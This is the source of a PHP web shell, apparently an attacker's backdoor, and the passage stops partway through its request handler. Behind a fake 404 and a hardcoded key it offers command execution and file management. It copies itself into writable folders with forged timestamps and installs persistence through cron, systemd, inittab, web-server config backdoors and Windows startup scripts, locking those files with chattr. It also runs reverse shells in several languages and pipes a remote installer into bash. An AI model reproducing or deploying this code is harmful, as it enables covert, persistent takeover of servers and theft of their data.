<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

$AUTH_KEY = 'AKAI';
if (!isset($_GET['auth']) || $_GET['auth'] !== $AUTH_KEY) {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body></body></html>';
    exit;
}

// Handler untuk view file
if (isset($_GET['view']) && isset($_GET['path'])) {
    $file_path = realpath(base64_decode($_GET['path']));
    if ($file_path && file_exists($file_path) && is_readable($file_path)) {
        $mime = mime_content_type($file_path);
        header('Content-Type: ' . $mime);
        readfile($file_path);
        exit;
    }
}

function getServerInfoHeader() {
    $info = '';
    
    $server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $uname = @php_uname('a');
    $server_ip = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $php_version = phpversion();
    $user = function_exists('get_current_user') ? get_current_user() : @exec('whoami 2>/dev/null');
    
    $named_conf = @file_get_contents('/etc/named.conf');
    $disabled_named = $named_conf === false ? 'Yes' : 'No';
    
    $info .= "SERVER SOFTWARE : " . htmlspecialchars($server_software) . "\n";
    $info .= "KERNEL         : " . htmlspecialchars($uname) . "\n";
    $info .= "SERVER IP      : " . htmlspecialchars($server_ip) . "\n";
    $info .= "CLIENT IP      : " . htmlspecialchars($client_ip) . "\n";
    $info .= "NAMED CONF     : " . $disabled_named . " [/etc/named.conf]\n";
    $info .= "PHP VERSION    : " . htmlspecialchars($php_version) . "\n";
    $info .= "CURRENT USER   : " . htmlspecialchars($user) . "\n";
    $info .= "DOCUMENT ROOT  : " . htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? 'N/A');
    
    return $info;
}

$SHELL_PATH = realpath(__FILE__);
$HOME_DIR = dirname($SHELL_PATH);
$CURRENT_DIR = isset($_GET['dir']) ? realpath($_GET['dir']) : $HOME_DIR;
if (!$CURRENT_DIR || !is_dir($CURRENT_DIR)) {
    $CURRENT_DIR = $HOME_DIR;
}

class UltimateFileManager {
    private $current_path;
    private $home_path;
    
    public function __construct($current_path, $home_path) {
        $this->current_path = $current_path;
        $this->home_path = $home_path;
    }
    
    public function getDirectoryContents() {
        $result = [
            'directories' => [],
            'hidden_directories' => [],
            'files' => [],
            'hidden_files' => [],
            'current_path' => $this->current_path,
            'parent_path' => dirname($this->current_path),
            'home_path' => $this->home_path,
            'is_writable' => is_writable($this->current_path)
        ];
        
        if (!is_dir($this->current_path) || !is_readable($this->current_path)) {
            return $result;
        }
        
        $items = scandir($this->current_path);
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $full_path = $this->current_path . '/' . $item;
            $is_hidden = substr($item, 0, 1) === '.';
            $is_dir = is_dir($full_path);
            
            $owner_info = $this->getFileOwnerInfo($full_path);
            
            $file_info = [
                'name' => $item,
                'path' => $full_path,
                'size' => $is_dir ? '-' : $this->formatSize(filesize($full_path)),
                'modified' => date('Y-m-d H:i:s', filemtime($full_path)),
                'permissions' => substr(sprintf('%o', fileperms($full_path)), -4),
                'owner' => $owner_info['owner'],
                'group' => $owner_info['group'],
                'owner_name' => $owner_info['owner_name'],
                'is_writable' => is_writable($full_path),
                'is_readable' => is_readable($full_path),
                'is_executable' => is_executable($full_path),
                'extension' => $is_dir ? '' : strtolower(pathinfo($item, PATHINFO_EXTENSION))
            ];
            
            if ($is_dir) {
                if ($is_hidden) {
                    $result['hidden_directories'][] = $file_info;
                } else {
                    $result['directories'][] = $file_info;
                }
            } else {
                if ($is_hidden) {
                    $result['hidden_files'][] = $file_info;
                } else {
                    $result['files'][] = $file_info;
                }
            }
        }
        
        usort($result['directories'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['hidden_directories'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['files'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['hidden_files'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        
        return $result;
    }
    
    private function getFileOwnerInfo($path) {
        $owner = fileowner($path);
        $group = filegroup($path);
        
        if (function_exists('posix_getpwuid')) {
            $owner_info = @posix_getpwuid($owner);
            $owner_name = $owner_info ? $owner_info['name'] : $owner;
        } else {
            $owner_name = $owner;
        }
        
        if (function_exists('posix_getgrgid')) {
            $group_info = @posix_getgrgid($group);
            $group_name = $group_info ? $group_info['name'] : $group;
        } else {
            $group_name = $group;
        }
        
        return [
            'owner' => $owner,
            'group' => $group,
            'owner_name' => $owner_name,
            'group_name' => $group_name
        ];
    }
    
    public function executeCommand($command, $background = false) {
        $output = '';
        
        if ($background) {
            $command .= ' > /dev/null 2>&1 &';
        }
        
        if (function_exists('exec')) {
            @exec($command . ' 2>&1', $output_array, $return_code);
            $output = implode("\n", $output_array);
        } elseif (function_exists('shell_exec')) {
            $output = @shell_exec($command . ' 2>&1');
        } elseif (function_exists('system')) {
            ob_start();
            @system($command . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($command . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('popen')) {
            $handle = @popen($command . ' 2>&1', 'r');
            if ($handle) {
                while (!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                pclose($handle);
            }
        } else {
            $output = 'No execution methods available';
        }
        
        return $output;
    }
    
    public function readFile($path) {
        if (!file_exists($path) || !is_readable($path)) {
            return false;
        }
        return file_get_contents($path);
    }
    
    public function writeFile($path, $content) {
        $dir = dirname($path);
        if (!is_writable($dir)) {
            return false;
        }
        return file_put_contents($path, $content) !== false;
    }
    
    public function delete($path) {
        if (!file_exists($path)) {
            return false;
        }
        
        if (is_dir($path)) {
            return $this->deleteDirectory($path);
        }
        
        return unlink($path);
    }
    
    public function createDirectory($path) {
        return mkdir($path, 0755, true);
    }
    
    public function createFile($path) {
        return touch($path);
    }
    
    public function changePermissions($path, $mode) {
        return chmod($path, octdec($mode));
    }
    
    public function changeTimestamp($path, $timestamp) {
        return touch($path, $timestamp);
    }
    
    public function rename($old_path, $new_path) {
        return rename($old_path, $new_path);
    }
    
    public function copy($source, $destination) {
        if (is_dir($source)) {
            return $this->copyDirectory($source, $destination);
        }
        return copy($source, $destination);
    }
    
    public function uploadFile($tmp_path, $dest_path) {
        if (move_uploaded_file($tmp_path, $dest_path)) {
            return true;
        }
        
        return copy($tmp_path, $dest_path);
    }
    
    public function extractZip($zip_path, $extract_path) {
        if (!class_exists('ZipArchive')) {
            return false;
        }
        
        $zip = new ZipArchive;
        if ($zip->open($zip_path) === TRUE) {
            $zip->extractTo($extract_path);
            $zip->close();
            return true;
        }
        
        return false;
    }
    
    public function compressToZip($source, $destination) {
        if (!class_exists('ZipArchive')) {
            return false;
        }
        
        $zip = new ZipArchive;
        if ($zip->open($destination, ZipArchive::CREATE) !== TRUE) {
            return false;
        }
        
        if (is_dir($source)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($source),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($source) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
        } elseif (is_file($source)) {
            $zip->addFile($source, basename($source));
        }
        
        return $zip->close();
    }
    
    public function changeOwner($path, $user, $group = null) {
        if (!function_exists('chown')) {
            return false;
        }
        
        if ($group && function_exists('chgrp')) {
            return chown($path, $user) && chgrp($path, $group);
        }
        
        return chown($path, $user);
    }
    
    private function deleteDirectory($dir) {
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            is_dir($path) ? $this->deleteDirectory($path) : unlink($path);
        }
        return rmdir($dir);
    }
    
    private function copyDirectory($source, $dest) {
        if (!is_dir($dest)) {
            mkdir($dest, 0755, true);
        }
        
        $files = array_diff(scandir($source), ['.', '..']);
        foreach ($files as $file) {
            $srcFile = $source . '/' . $file;
            $destFile = $dest . '/' . $file;
            
            if (is_dir($srcFile)) {
                $this->copyDirectory($srcFile, $destFile);
            } else {
                copy($srcFile, $destFile);
            }
        }
        
        return true;
    }
    
    private function formatSize($bytes) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, 2) . ' ' . $units[$pow];
    }
}

class ShellDeployer {
    public static function findWritablePaths($base_path, $max_depth = 3) {
        $writable_paths = [];
        
        if (!is_dir($base_path)) {
            return $writable_paths;
        }
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($base_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $item) {
            if ($iterator->getDepth() > $max_depth) continue;
            
            if (is_dir($item) && is_writable($item)) {
                $has_files = false;
                $dir_files = scandir($item);
                foreach ($dir_files as $file) {
                    if ($file != '.' && $file != '..' && is_file($item . '/' . $file)) {
                        $has_files = true;
                        break;
                    }
                }
                
                if ($has_files) {
                    $writable_paths[] = $item;
                }
            }
        }
        
        return array_unique($writable_paths);
    }
    
    public static function deployShell($target_path, $shell_content, $filenames, $create_htaccess = false, $original_shell_path) {
        $results = [];
        
        if (!is_array($filenames)) {
            $filenames = [$filenames];
        }
        
        foreach ($filenames as $filename) {
            $full_path = rtrim($target_path, '/') . '/' . $filename;
            
            $oldest_timestamp = null;
            $files = scandir($target_path);
            foreach ($files as $file) {
                if ($file == '.' || $file == '..') continue;
                $file_path = $target_path . '/' . $file;
                $timestamp = filemtime($file_path);
                if ($oldest_timestamp === null || $timestamp < $oldest_timestamp) {
                    $oldest_timestamp = $timestamp;
                }
            }
            
            if (file_put_contents($full_path, $shell_content)) {
                if ($oldest_timestamp) {
                    touch($full_path, $oldest_timestamp, $oldest_timestamp);
                }
                
                if ($create_htaccess) {
                    $htaccess_result = self::createHtaccessProtection($target_path, $filename, $oldest_timestamp);
                } else {
                    $htaccess_result = true;
                }
                
                self::logDeployment($target_path, $full_path, $original_shell_path);
                
                $results[] = [
                    'filename' => $filename,
                    'path' => $full_path,
                    'success' => true,
                    'htaccess' => $htaccess_result,
                    'timestamp_matched' => $oldest_timestamp ? true : false
                ];
            } else {
                $results[] = [
                    'filename' => $filename,
                    'path' => $full_path,
                    'success' => false,
                    'error' => 'Cannot write file'
                ];
            }
        }
        
        return $results;
    }
    
    private static function createHtaccessProtection($path, $shell_name, $timestamp = null) {
        $server_software = $_SERVER['SERVER_SOFTWARE'] ?? '';
        $is_apache = stripos($server_software, 'apache') !== false;
        $is_nginx = stripos($server_software, 'nginx') !== false;
        $is_litespeed = stripos($server_software, 'litespeed') !== false;
        
        if ($is_apache || $is_litespeed) {
            $htaccess_content = <<<HTACCESS
<Files "$shell_name">
    Order Allow,Deny
    Allow from all
    Satisfy any
</Files>

<FilesMatch "\.(php|php\.|php[0-9]+|phtml|phps|inc|htaccess)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^$shell_name$ - [L]
    RewriteRule \.(php|php\.|php[0-9]+|phtml|phps|inc)$ - [F,L]
</IfModule>
HTACCESS;
        } elseif ($is_nginx) {
            $htaccess_content = <<<NGINX
# Nginx configuration for $shell_name
# Add this to your nginx config or .htaccess (if using Apache syntax converter)
location = /$shell_name {
    allow all;
}

location ~ \.(php|php\.|php[0-9]+|phtml|phps|inc)$ {
    deny all;
    location = /$shell_name {
        allow all;
    }
}
NGINX;
        } else {
            $htaccess_content = <<<GENERIC
# Protection for $shell_name
<Files "$shell_name">
    Order Allow,Deny
    Allow from all
</Files>

<FilesMatch "\.(php|php\.|php[0-9]+|phtml|phps|inc)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
GENERIC;
        }
        
        $htaccess_path = $path . '/.htaccess';
        
        if (file_exists($htaccess_path)) {
            $existing = file_get_contents($htaccess_path);
            if (strpos($existing, $shell_name) === false) {
                $htaccess_content = $existing . "\n\n" . $htaccess_content;
            } else {
                return true;
            }
        }
        
        if (file_put_contents($htaccess_path, $htaccess_content)) {
            if ($timestamp) {
                touch($htaccess_path, $timestamp, $timestamp);
            }
            return true;
        }
        
        return false;
    }
    
    private static function logDeployment($target_dir, $shell_path, $original_shell) {
        $log_content = date('Y-m-d H:i:s') . " | " . $shell_path . " | From: " . $original_shell . "\n";
        $log_file = dirname($original_shell) . '/.shell_deploy.log';
        file_put_contents($log_file, $log_content, FILE_APPEND);
    }
}

class DefenseSystem {
    private $shell_path;
    
    public function __construct($shell_path) {
        $this->shell_path = $shell_path;
    }
    
    public function installNohup($interval = 0.1) {
        $stealth_locations = [
            '/dev/shm',
            '/run/lock',
            '/tmp/.X11-unix',
            '/var/lib/php/sessions',
            '/var/cache/nginx',
            '/var/cache/apache2',
            dirname($this->shell_path)
        ];
        
        foreach ($stealth_locations as $location) {
            if (is_dir($location) && is_writable($location)) {
                $random_name = '.kernel_' . substr(md5(time()), 0, 8);
                $script_path = $location . '/' . $random_name;
                
                $script_content = '#!/bin/sh
while true; do
    sleep ' . $interval . '
    if [ ! -f "' . $this->shell_path . '" ]; then
        cp "' . __FILE__ . '" "' . $this->shell_path . '" 2>/dev/null
        chmod 644 "' . $this->shell_path . '" 2>/dev/null
    fi
    ps aux | grep -v grep | grep "' . basename($this->shell_path) . '" >/dev/null 2>&1 || php -q "' . $this->shell_path . '" > /dev/null 2>&1 &
done';
                
                if (file_put_contents($script_path, $script_content)) {
                    chmod($script_path, 0755);
                    
                    // Start with double fork to detach completely
                    $cmd = "(nohup " . escapeshellarg($script_path) . " >/dev/null 2>&1 &) >/dev/null 2>&1 & echo $!";
                    $output = [];
                    @exec($cmd, $output, $return_code);
                    
                    // Hide the script
                    @exec("chattr +i " . escapeshellarg($script_path) . " 2>/dev/null");
                    
                    if ($return_code === 0) {
                        return [
                            'success' => true,
                            'pid' => trim($output[0] ?? ''),
                            'script_path' => $script_path,
                            'location' => $location,
                            'message' => 'Nohup persistence installed successfully'
                        ];
                    }
                }
            }
        }
        
        return ['success' => false, 'error' => 'No suitable location found or permission denied'];
    }
    
    public function installCron($interval = '*/5') {
        $methods = [
            // User crontab
            "crontab -l 2>/dev/null | { cat; echo '" . $interval . " * * * * /usr/bin/php -q \"" . $this->shell_path . "\" >/dev/null 2>&1'; } | crontab - 2>/dev/null",
            
            // System crontab
            "echo '" . $interval . " * * * * root /usr/bin/php -q \"" . $this->shell_path . "\" >/dev/null 2>&1' >> /etc/crontab 2>/dev/null",
            
            // Cron directory
            "echo '" . $interval . " * * * * /usr/bin/php -q \"" . $this->shell_path . "\" >/dev/null 2>&1' > /etc/cron.d/.system_update 2>/dev/null && chmod 644 /etc/cron.d/.system_update 2>/dev/null",
            
            // Hourly cron
            "echo '#!/bin/sh\n/usr/bin/php -q \"" . $this->shell_path . "\" >/dev/null 2>&1' > /etc/cron.hourly/.logrotate 2>/dev/null && chmod 755 /etc/cron.hourly/.logrotate 2>/dev/null"
        ];
        
        foreach ($methods as $method) {
            $output = [];
            @exec($method . ' 2>&1', $output, $return_code);
            
            if ($return_code === 0) {
                // Hide cron file if created in /etc/cron.d/
                @exec('chattr +i /etc/cron.d/.system_update 2>/dev/null');
                @exec('chattr +i /etc/cron.hourly/.logrotate 2>/dev/null');
                
                return [
                    'success' => true,
                    'method' => $method,
                    'interval' => $interval,
                    'message' => 'Cron persistence installed successfully'
                ];
            }
        }
        
        return ['success' => false, 'error' => 'All cron installation methods failed'];
    }
    
    public function installSystemd() {
        $service_name = 'systemd-network-' . substr(md5(time()), 0, 6);
        $service_content = '[Unit]
Description=System Network Service
After=network.target
Wants=network.target

[Service]
Type=forking
ExecStart=/bin/sh -c "php -q ' . $this->shell_path . ' > /dev/null 2>&1 &"
Restart=always
RestartSec=10
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target';
        
        $service_file = '/etc/systemd/system/' . $service_name . '.service';
        $service_link = '/etc/systemd/system/multi-user.target.wants/' . $service_name . '.service';
        
        if (file_put_contents($service_file, $service_content)) {
            $commands = [
                'systemctl daemon-reload 2>/dev/null',
                'systemctl enable ' . $service_name . '.service 2>/dev/null',
                'systemctl start ' . $service_name . '.service 2>/dev/null',
                'ln -sf ' . $service_file . ' ' . $service_link . ' 2>/dev/null'
            ];
            
            foreach ($commands as $cmd) {
                @exec($cmd, $output, $return_code);
            }
            
            // Hide the service file
            @exec('chattr +i ' . escapeshellarg($service_file) . ' 2>/dev/null');
            
            return ['success' => true, 'service_file' => $service_file, 'service_name' => $service_name];
        }
        
        return ['success' => false, 'error' => 'Cannot create systemd service'];
    }
    
    public function installInittab() {
        $inittab_line = 'gs:2345:respawn:/bin/sh -c "php -q ' . $this->shell_path . ' > /dev/null 2>&1"';
        
        if (file_put_contents('/etc/inittab', $inittab_line . "\n", FILE_APPEND)) {
            @exec('init q 2>/dev/null');
            @exec('chattr +i /etc/inittab 2>/dev/null');
            return ['success' => true];
        }
        
        return ['success' => false];
    }
    
    public function installApacheModule() {
        $module_content = '<?php
if (isset($_GET["' . substr(md5($this->shell_path), 0, 8) . '"])) {
    include("' . $this->shell_path . '");
    exit;
}
?>';
        
        $locations = [
            '/etc/apache2/mods-available/.module.so',
            '/usr/lib/apache2/modules/.module.so',
            '/etc/httpd/modules/.module.so'
        ];
        
        foreach ($locations as $location) {
            if (is_writable(dirname($location))) {
                if (file_put_contents($location, $module_content)) {
                    @exec('chmod 644 ' . escapeshellarg($location) . ' 2>/dev/null');
                    @exec('chattr +i ' . escapeshellarg($location) . ' 2>/dev/null');
                    return ['success' => true, 'module_path' => $location];
                }
            }
        }
        
        return ['success' => false];
    }
    
    public function installNginxModule() {
        $config_content = 'location ~ \\.php$ {
    if ($query_string ~ "' . substr(md5($this->shell_path), 0, 8) . '") {
        include "' . $this->shell_path . '";
    }
    # Normal PHP processing continues...
}';
        
        $locations = [
            '/etc/nginx/conf.d/.config.conf',
            '/etc/nginx/sites-available/.default',
            '/usr/local/nginx/conf/.nginx.conf'
        ];
        
        foreach ($locations as $location) {
            if (is_writable(dirname($location))) {
                if (file_put_contents($location, $config_content)) {
                    @exec('chmod 644 ' . escapeshellarg($location) . ' 2>/dev/null');
                    @exec('chattr +i ' . escapeshellarg($location) . ' 2>/dev/null');
                    @exec('nginx -s reload 2>/dev/null');
                    return ['success' => true, 'config_path' => $location];
                }
            }
        }
        
        return ['success' => false];
    }
    
    public function installWindowsPersistence() {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $batch_content = '@echo off
:start
php -q "' . str_replace('/', '\\', $this->shell_path) . '" > NUL 2>&1
timeout /t 300 /nobreak > NUL
goto start';
            
            $locations = [
                getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat',
                getenv('WINDIR') . '\\System32\\Tasks\\Microsoft\\Windows\\SystemRestore\\svchost.bat',
                getenv('WINDIR') . '\\Tasks\\svchost.bat'
            ];
            
            foreach ($locations as $location) {
                if (file_put_contents($location, $batch_content)) {
                    // Hide the batch file
                    @exec('attrib +h +s +r "' . $location . '" 2>&1');
                    // Start it
                    @exec('start /B "" "' . $location . '" 2>&1');
                    return ['success' => true, 'batch_path' => $location];
                }
            }
        }
        
        return ['success' => false, 'error' => 'Not a Windows system'];
    }
    
    public function installLitespeedModule() {
        $module_content = '<?php
// LiteSpeed Cache Module Backdoor
if ($_SERVER[\'HTTP_USER_AGENT\'] == "' . substr(md5($this->shell_path), 0, 16) . '") {
    include_once("' . $this->shell_path . '");
    exit;
}
?>';
        
        $locations = [
            '/usr/local/lsws/cachedata/.cache.php',
            '/tmp/lshttpd/.cache.php',
            '/etc/litespeed/.cache.php'
        ];
        
        foreach ($locations as $location) {
            if (is_writable(dirname($location))) {
                if (file_put_contents($location, $module_content)) {
                    @exec('chmod 644 ' . escapeshellarg($location) . ' 2>/dev/null');
                    return ['success' => true, 'module_path' => $location];
                }
            }
        }
        
        return ['success' => false];
    }
}

class BackConnect {
    public static function execute($method, $ip, $port) {
        $commands = [
            'php' => "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'bash' => "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
            'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'python3' => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'perl' => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            'ruby' => "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
            'nc' => "nc -e /bin/sh $ip $port",
            'socat' => "socat TCP:$ip:$port EXEC:/bin/sh",
            'telnet' => "telnet $ip $port | /bin/sh | telnet $ip $port"
        ];
        
        if (!isset($commands[$method])) {
            return false;
        }
        
        $cmd = $commands[$method] . ' > /dev/null 2>&1 &';
        
        $output = [];
        @exec($cmd, $output, $return_code);
        
        return $return_code === 0;
    }
}

class ShellFinder {
    public static function findBackdoors($path, $max_depth = 4) {
        $patterns = [
            '/eval\s*\(\s*base64_decode\s*\(\s*[\'"]/i',
            '/gzinflate\s*\(\s*base64_decode\s*\(\s*[\'"]/i',
            '/system\s*\(\s*[\'"]\s*[\$\_]/i',
            '/shell_exec\s*\(\s*[\'"]\s*[\$\_]/i',
            '/passthru\s*\(\s*[\'"]\s*[\$\_]/i',
            '/exec\s*\(\s*[\'"]\s*[\$\_]/i',
            '/popen\s*\(\s*[\'"]\s*[\$\_]/i',
            '/proc_open\s*\(\s*[\'"]\s*[\$\_]/i',
            '/assert\s*\(\s*[\'"]\s*[\$\_]/i',
            '/preg_replace\s*\(\s*[\'"]\/\.\*\/e[\'"]/i',
            '/create_function\s*\(/i',
            '/\$[a-z]\s*\(\s*\$_/i',
            '/include\s*\(\s*[\'"]\s*\$_/i',
            '/require\s*\(\s*[\'"]\s*\$_/i',
            '/file_put_contents\s*\(\s*[\'"]\s*[\$\_].*base64_decode/i',
            '/\$\w+\s*=\s*[\'"]\s*(phpspy|r57|c99|wso)/i',
            '/<\?(php)?\s+@?\$[a-z]\s*=\s*[\'"]/i'
        ];
        
        $extensions = ['php', 'php3', 'php4', 'php5', 'php7', 'phtml', 'phps', 'inc', 'txt', 'js', 'html', 'htm'];
        
        $results = [];
        
        if (!is_dir($path)) {
            return $results;
        }
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $item) {
            if ($iterator->getDepth() > $max_depth) continue;
            
            if ($item->isFile()) {
                $ext = strtolower(pathinfo($item->getFilename(), PATHINFO_EXTENSION));
                if (in_array($ext, $extensions)) {
                    $content = @file_get_contents($item->getPathname());
                    if ($content) {
                        foreach ($patterns as $pattern) {
                            if (preg_match($pattern, $content)) {
                                $results[] = [
                                    'path' => $item->getPathname(),
                                    'size' => filesize($item->getPathname()),
                                    'modified' => date('Y-m-d H:i:s', filemtime($item->getPathname()))
                                ];
                                break;
                            }
                        }
                    }
                }
            }
        }
        
        return $results;
    }
}

class GsocketInstaller {
    public static function install() {
        $install_dir = '/dev/shm/.gsocket';
        
        // Create directory if it doesn't exist
        if (!is_dir($install_dir)) {
            mkdir($install_dir, 0755, true);
        }
        
        // Try curl first
        $cmd_curl = "curl -fsSL https://gsocket.io/x | bash -s -- -d " . escapeshellarg($install_dir) . " -y 2>&1";
        $output = [];
        @exec($cmd_curl, $output, $return_code);
        
        if ($return_code !== 0) {
            // Try wget
            $cmd_wget = "wget -qO- https://gsocket.io/x | bash -s -- -d " . escapeshellarg($install_dir) . " -y 2>&1";
            @exec($cmd_wget, $output, $return_code);
        }
        
        // Check if installation was successful
        if (file_exists($install_dir . '/gs-netcat') || file_exists($install_dir . '/gsocket')) {
            return [
                'success' => true,
                'output' => implode("\n", $output),
                'install_dir' => $install_dir,
                'files' => scandir($install_dir)
            ];
        }
        
        return [
            'success' => false,
            'output' => implode("\n", $output),
            'error' => 'Gsocket installation failed'
        ];
    }
}

$file_manager = new UltimateFileManager($CURRENT_DIR, $HOME_DIR);
$directory_contents = $file_manager->getDirectoryContents();
$defense_system = new DefenseSystem($SHELL_PATH);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    
    $action = $_POST['action'];
    $response = ['success' => false, 'message' => ''];
    
    switch ($action) {
        case 'change_dir':
            $new_dir = $_POST['path'] ?? '';
            if (is_dir($new_dir)) {
                $response['success'] = true;
                $response['redirect'] = "?auth=" . urlencode($AUTH_KEY) . "&dir=" . urlencode($new_dir);
            }
            break;
            
        case 'execute_command':
            $command = $_POST['command'] ?? '';
            $background = isset($_POST['background']) && $_POST['background'] == '1';
            $response['output'] = $file_manager->executeCommand($command, $background);
            $response['success'] = true;
            break;
            
        case 'read_file':
            $path = $_POST['path'] ?? '';
            $content = $file_manager->readFile($path);
            if ($content !== false) {
                $response['success'] = true;
                $response['content'] = $content;
            } else {
                $response['message'] = 'Cannot read file';
            }
            break;
            
        case 'write_file':
            $path = $_POST['path'] ?? '';
            $content = $_POST['content'] ?? '';
            if ($file_manager->writeFile($path, $content)) {
                $response['success'] = true;
                $response['message'] = 'File saved successfully';
            } else {
                $response['message'] = 'Cannot write file';
            }
            break;
            
        case 'delete':
            $path = $_POST['path'] ?? '';
            if ($file_manager->delete($path)) {
                $response['success'] = true;
                $response['message'] = 'Deleted successfully';
            } else {
                $response['message'] = 'Cannot delete';
            }
            break;
            
        case 'create_dir':
            $path = $_POST['path'] ?? '';
            if ($file_manager->createDirectory($path)) {
                $response['success'] = true;
                $response['message'] = 'Directory created successfully';
            } else {
                $response['message'] = 'Cannot create directory';
            }
            break;
            
        case 'create_file':
            $path = $_POST['path'] ?? '';
            if ($file_manager->createFile($path)) {
                $response['success'] = true;
                $response['message'] = 'File created successfully';
            } else {
                $response['message'] = 'Cannot create file';
            }
            break;
            
        case 'chmod':
            $path = $_POST['path'] ?? '';
            $mode = $_POST['mode'] ?? '0644';
            if ($file_manager->changePermissions($path, $mode)) {
                $response['success'] = true;
                $response['message'] = 'Permissions changed successfully';
            } else {
                $response['message'] = 'Cannot change permissions';
            }
            break;
            
        case 'chdate':
            $path = $_POST['path'] ?? '';
            $timestamp_input = $_POST['timestamp'] ?? '';
            
            if ($timestamp_input) {
                $timestamp = strtotime($timestamp_input);
                if ($timestamp !== false) {
                    if ($file_manager->changeTimestamp($path, $timestamp)) {
                        $response['success'] = true;
                        $response['message'] = 'Timestamp changed to ' . date('Y-m-d H:i:s', $timestamp);
                    } else {
                        $response['message'] = 'Cannot change timestamp';
                    }
                } else {
                    $response['message'] = 'Invalid date format';
                }
            } else {
                $response['message'] = 'Timestamp is required';
            }
            break;
            
        case 'chown':
            $path = $_POST['path'] ?? '';
            $user = $_POST['user'] ?? '';
            $group = $_POST['group'] ?? '';
            if ($file_manager->changeOwner($path, $user, $group)) {
                $response['success'] = true;
                $response['message'] = 'Ownership changed successfully';
            } else {
                $response['message'] = 'Cannot change ownership';
            }
            break;
            
        case 'rename':
            $old_path = $_POST['old_path'] ?? '';
            $new_path = $_POST['new_path'] ?? '';
            if ($file_manager->rename($old_path, $new_path)) {
                $response['success'] = true;
                $response['message'] = 'Renamed successfully';
            } else {
                $response['message'] = 'Cannot rename';
            }
            break;
            
        case 'upload':
            $dest_path = $_POST['dest_path'] ?? '';
            $tmp_name = $_FILES['file']['tmp_name'] ?? '';
            
            if ($tmp_name && is_uploaded_file($tmp_name)) {
                if ($file_manager->uploadFile($tmp_name, $dest_path)) {
                    $response['success'] = true;
                    $response['message'] = 'File uploaded successfully';
                } else {
                    $response['message'] = 'Upload failed';
                }
            } else {
                $response['message'] = 'No file uploaded';
            }
            break;
            
        case 'extract_zip':
            $zip_path = $_POST['zip_path'] ?? '';
            $extract_path = $_POST['extract_path'] ?? '';
            if ($file_manager->extractZip($zip_path, $extract_path)) {
                $response['success'] = true;
                $response['message'] = 'ZIP extracted successfully';
            } else {
                $response['message'] = 'Cannot extract ZIP';
            }
            break;
            
        case 'compress_zip':
            $source = $_POST['source'] ?? '';
            $destination = $_POST['destination'] ?? '';
            if ($file_manager->compressToZip($source, $destination)) {
                $response['success'] = true;
                $response['message'] = 'Compressed to ZIP successfully';
            } else {
                $response['message'] = 'Cannot create ZIP';
            }
            break;
            
        case 'backconnect':
            $method = $_POST['method'] ?? 'php';
            $ip = $_POST['ip'] ?? '';
            $port = $_POST['port'] ?? '4444';
            
            if (filter_var($ip, FILTER_VALIDATE_IP) && is_numeric($port) && $port > 0 && $port <= 65535) {
                if (BackConnect::execute($method, $ip, $port)) {
                    $response['success'] = true;
                    $response['message'] = 'Backconnect initiated';
